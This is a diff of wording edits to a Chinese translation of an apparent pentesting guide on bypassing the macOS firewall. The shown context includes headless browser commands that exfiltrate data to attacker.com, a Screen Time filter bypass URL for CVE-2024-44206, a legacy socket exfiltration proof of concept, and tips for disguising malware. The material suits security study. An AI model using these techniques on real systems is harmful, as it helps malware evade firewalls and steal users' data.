@@ -8,23 +8,23 @@
 
 ### 滥用白名单名称
 
-- 例如，使用知名 macOS 进程的名称调用恶意软件，如 **`launchd`**
+- 例如，使用 **`launchd`** 等知名 macOS 进程的名称调用恶意软件。
 
 ### 合成点击
 
-- 如果防火墙要求用户授权，让恶意软件 **点击允许**
+- 如果防火墙要求用户授权，让恶意软件 **点击允许**。
 
-### **使用苹果签名的二进制文件**
+### **使用 Apple 签名的二进制文件**
 
-- 像 **`curl`**，还有其他如 **`whois`**
+- 像 **`curl`**，还有其他如 **`whois`**。
 
-### 知名苹果域名
+### 知名的苹果域名
 
 防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。
 
 ### 通用绕过
 
-一些尝试绕过防火墙的想法
+一些尝试绕过防火墙的想法。
 
 ### 检查允许的流量
 
@@ -53,7 +53,7 @@ end tell
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-- 火狐浏览器
+- 火狐
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
@@ -74,7 +74,7 @@ macos-proces-abuse/
 ## 最近的 macOS 防火墙绕过漏洞 (2023-2025)
 
 ### 网络内容过滤器（屏幕时间）绕过 – **CVE-2024-44206**
-在2024年7月，苹果修复了Safari/WebKit中的一个关键漏洞，该漏洞破坏了屏幕时间家长控制使用的系统范围“网络内容过滤器”。
+在2024年7月，苹果修复了Safari/WebKit中的一个关键漏洞，该漏洞破坏了屏幕时间家长控制使用的系统范围内的“网络内容过滤器”。
 一个特别构造的URI（例如，带有双重URL编码的“://”）未被屏幕时间ACL识别，但被WebKit接受，因此请求未经过滤地发送出去。任何可以打开URL的进程（包括沙盒或未签名的代码）因此可以访问用户或MDM配置文件明确阻止的域。
 
 实际测试（未修补的系统）：
@@ -91,9 +91,9 @@ open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-### 滥用苹果签名的辅助服务（遗留 – macOS 11.2 之前）
-在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许 ~50 个苹果二进制文件，如 **`nsurlsessiond`** 和 App Store，绕过所有使用网络扩展框架（LuLu、Little Snitch 等）实现的套接字过滤防火墙。
-恶意软件可以简单地生成一个被排除的进程——或向其中注入代码——并通过已经允许的套接字隧道其自身流量。苹果在 macOS 11.2 中完全移除了排除列表，但该技术在无法升级的系统上仍然相关。
+### 滥用苹果签名的辅助服务（遗留 - macOS 11.2 之前）
+在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许大约 50 个苹果二进制文件，如 **`nsurlsessiond`** 和 App Store，绕过所有使用网络扩展框架（LuLu、Little Snitch 等）实现的套接字过滤防火墙。
+恶意软件可以简单地生成一个被排除的进程——或向其中注入代码——并通过已经允许的套接字隧道其自己的流量。苹果在 macOS 11.2 中完全移除了排除列表，但该技术在无法升级的系统上仍然相关。
 
 示例概念验证（11.2 之前）：
 ```python
@@ -112,7 +112,7 @@ s.send(b"exfil...")
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. 枚举已经拥有 *outgoing-network* 权限的二进制文件（对搭便车很有用）：
+2. 枚举已经持有 *outgoing-network* 权限的二进制文件（对搭便车很有用）：
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
